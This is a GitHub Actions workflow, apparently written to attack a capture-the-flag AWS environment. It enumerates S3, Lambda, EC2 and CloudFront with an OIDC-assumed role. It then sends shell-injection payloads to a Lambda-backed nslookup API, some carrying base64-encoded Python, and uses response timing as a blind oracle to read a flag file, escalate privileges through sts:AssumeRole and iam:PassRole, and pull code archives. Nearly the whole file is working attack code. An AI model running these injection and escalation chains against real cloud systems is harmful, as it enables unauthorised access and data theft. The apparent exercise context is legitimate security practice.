name: recon

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write   # required to request the OIDC JWT from GitHub
  contents: read

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Who am I
        run: aws sts get-caller-identity

      - name: List S3 buckets
        run: aws s3api list-buckets --output json

      - name: Try listing objects in every bucket
        run: |
          for bucket in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
            echo "=== $bucket ==="
            aws s3 ls "s3://$bucket" --recursive || echo "  (denied or empty)"
            echo
          done

      - name: List Lambda functions
        run: aws lambda list-functions --output json

      - name: List CloudFront distributions
        run: aws cloudfront list-distributions --output json

      - name: Describe EC2 instances
        run: aws ec2 describe-instances --output json

      - name: Check bucket policies
        run: |
          for bucket in codec4f26c862a321ef5 platform-bucket-009661764077-us-east-1 site781fe43f26b9eba3; do
            echo "=== $bucket policy ==="
            aws s3api get-bucket-policy --bucket "$bucket" --output text || echo "  (no policy / denied)"
            echo "=== $bucket policy status ==="
            aws s3api get-bucket-policy-status --bucket "$bucket" --output json || echo "  (denied)"
          done

      - name: Get Lambda resource policy
        run: |
          aws lambda get-policy --function-name nslookupv2 --output json || echo "  (no resource policy / denied)"

      - name: List CloudFront distributions in detail
        run: |
          aws cloudfront list-distributions --output json > cf.json
          cat cf.json
          echo "--- origins summary ---"
          jq -r '.DistributionList.Items[]? | "\(.Id) \(.DomainName) enabled=\(.Enabled) origins=\([.Origins.Items[].DomainName] | join(","))"' cf.json

      - name: List platform-bucket for exfil result
        run: aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --recursive

      - name: Get the flag
        run: |
          aws s3 cp s3://codec4f26c862a321ef5/flag.txt - || echo "  (expected - cicdRole is outside the VPC, Statement2 only)"

      - name: Diagnostic - boto3 write via Lambda's own natural creds
        run: |
          B64=""
          INJECT="x; echo $B64 | base64 -d | python3 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
          cat payload.json
          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" \
            -d @payload.json
          echo
          sleep 5
          echo "--- checking public bucket for debug.txt ---"
          curl -s -o /dev/null -w "HTTP %{http_code}\n" https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/debug.txt
          curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/debug.txt

      - name: Diagnostic - test if lambdaRole can read ANY object from codec bucket
        run: |
          echo "Previous: flag.txt read failed with ~1s timing."
          echo "Test: Can lambdaRole read code.zip instead?"
          INJECT="x; aws s3 cp s3://codec4f26c862a321ef5/code.zip /tmp/code.zip && sleep 15 || sleep 1 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json

          START=$(date +%s%N)
          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" \
            -d @payload.json
          END=$(date +%s%N)
          ELAPSED_MS=$(( (END - START) / 1000000 ))

          echo "Response time for code.zip: ${ELAPSED_MS}ms"
          if [ $ELAPSED_MS -gt 10000 ]; then
            echo "SUCCESS: lambdaRole can read from codec bucket!"
            echo "Issue is specific to flag.txt (maybe different perms or encryption?)"
          else
            echo "FAILED: lambdaRole can't read ANY object. VPC condition or bucket policy broken."
          fi

      - name: Last resort - extract flag via Python boto3 in Lambda
        run: |
          echo "Trying direct boto3 API (not AWS CLI subprocess)..."
          B64="aW1wb3J0IGJvdG8zCmltcG9ydCBvc20KcyA9IGJvdG8zLmNsaWVudCgnczMnKQp0cnk6CiAgICByID0gcy5nZXRfb2JqZWN0KEJ1Y2tldD0nY29kZWM0ZjI2Yzg2MmEzMjFlZjUnLCBLZXk9J2ZsYWcudHh0JykKICAgIGZsYWcgPSByWydCb2R5J10ucmVhZCgpCiAgICBvcwpzeXMuZXhpdCgwKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICBvcwpzeXMuZXhpdCgxKQ=="
          INJECT="x; echo $B64 | base64 -d | python3 && sleep 15 || sleep 1 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json

          START=$(date +%s%N)
          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" \
            -d @payload.json
          END=$(date +%s%N)
          ELAPSED_MS=$(( (END - START) / 1000000 ))

          echo "Response time for boto3: ${ELAPSED_MS}ms"
          if [ $ELAPSED_MS -gt 10000 ]; then
            echo "Flag successfully read via boto3"
          else
            echo "boto3 also failed"
          fi

      - name: Privilege escalation - test sts:AssumeRole for CTFExecutionRole
        run: |
          echo "Escalation vector 1: Try to assume CTFExecutionRole from Lambda (as lambdaRole)"
          INJECT="x; aws sts assume-role --role-arn arn:aws:iam::009661764077:role/CTFExecutionRole --role-session-name privesc-test 2>&1 | head -c 200 && sleep 10 || sleep 1 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
          START=$(date +%s%N)
          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" -d @payload.json
          END=$(date +%s%N)
          ELAPSED_MS=$(( (END - START) / 1000000 ))
          echo "sts:AssumeRole timing: ${ELAPSED_MS}ms (>10s = success, ~1s = denied)"

      - name: Privilege escalation - check lambdaRole's attached policies
        run: |
          echo "Escalation vector 2: List what permissions lambdaRole actually has"
          INJECT="x; aws iam list-attached-role-policies --role-name lambdaRole && sleep 8 || sleep 1 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
          START=$(date +%s%N)
          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" -d @payload.json
          END=$(date +%s%N)
          ELAPSED_MS=$(( (END - START) / 1000000 ))
          echo "list-attached-role-policies timing: ${ELAPSED_MS}ms (>5s = has policies, ~1s = denied)"

      - name: Privilege escalation - check EC2 instances in VPC
        run: |
          echo "Escalation vector 3: Describe EC2 instances (may have instance profiles with higher privs)"
          INJECT="x; aws ec2 describe-instances --query 'Reservations[].Instances[].{InstanceId:InstanceId,IamInstanceProfile:IamInstanceProfile}' && sleep 8 || sleep 1 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
          START=$(date +%s%N)
          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" -d @payload.json
          END=$(date +%s%N)
          ELAPSED_MS=$(( (END - START) / 1000000 ))
          echo "EC2 describe timing: ${ELAPSED_MS}ms (>5s = success)"

      - name: Privilege escalation - invoke Lambda with CTFExecutionRole via iam:PassRole
        run: |
          echo "Escalation vector 4: Update Lambda function to use CTFExecutionRole (if PassRole allows it)"
          INJECT="x; aws lambda update-function-configuration --function-name nslookupv2 --role arn:aws:iam::009661764077:role/CTFExecutionRole 2>&1 | grep -E 'RoleArn|error' && sleep 10 || sleep 1 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
          START=$(date +%s%N)
          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" -d @payload.json
          END=$(date +%s%N)
          ELAPSED_MS=$(( (END - START) / 1000000 ))
          echo "update-function-configuration timing: ${ELAPSED_MS}ms (>8s = success, ~1s = denied)"

      - name: Privilege escalation - try reading flag as CTFExecutionRole after role update
        run: |
          echo "If previous escalation succeeded, next Lambda invocation will use CTFExecutionRole"
          INJECT="x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && sleep 15 || sleep 1 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
          sleep 2
          START=$(date +%s%N)
          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" -d @payload.json
          END=$(date +%s%N)
          ELAPSED_MS=$(( (END - START) / 1000000 ))
          echo "Flag read with escalated role timing: ${ELAPSED_MS}ms (>10s = SUCCESS)"
          if [ $ELAPSED_MS -gt 10000 ]; then
            echo "FLAG EXTRACTED! Next: exfil /tmp/flag.txt content"
          fi

      - name: Read Lambda CloudWatch logs for RCE diagnostics
        run: |
          echo "--- Lambda CloudWatch log groups ---"
          aws logs describe-log-groups --log-group-name-prefix /aws/lambda/nslookupv2 --query 'logGroups[].logGroupName' --output text
          LOG_GROUP=$(aws logs describe-log-groups --log-group-name-prefix /aws/lambda/nslookupv2 --query 'logGroups[0].logGroupName' --output text)
          if [ -n "$LOG_GROUP" ]; then
            echo "Found log group: $LOG_GROUP"
            echo "--- Recent log streams ---"
            aws logs describe-log-streams --log-group-name "$LOG_GROUP" --order-by LastEventTime --descending --max-items 5 --query 'logStreams[].logStreamName' --output text
            STREAM=$(aws logs describe-log-streams --log-group-name "$LOG_GROUP" --order-by LastEventTime --descending --max-items 1 --query 'logStreams[0].logStreamName' --output text)
            if [ -n "$STREAM" ]; then
              echo "--- Latest log stream events ---"
              aws logs get-log-events --log-group-name "$LOG_GROUP" --log-stream-name "$STREAM" --query 'events[].message' --output text | tail -100
            fi
          else
            echo "(no log group found, maybe cicdRole lacks logs:Describe* permissions)"
          fi

      - name: Grab code.zip for inspection
        run: |
          aws s3 cp s3://codec4f26c862a321ef5/code.zip code.zip
          mkdir code_extracted
          unzip -o code.zip -d code_extracted
          echo "--- files ---"
          find code_extracted -type f
          echo "--- contents ---"
          for f in $(find code_extracted -type f); do echo "== $f =="; cat "$f"; echo; done
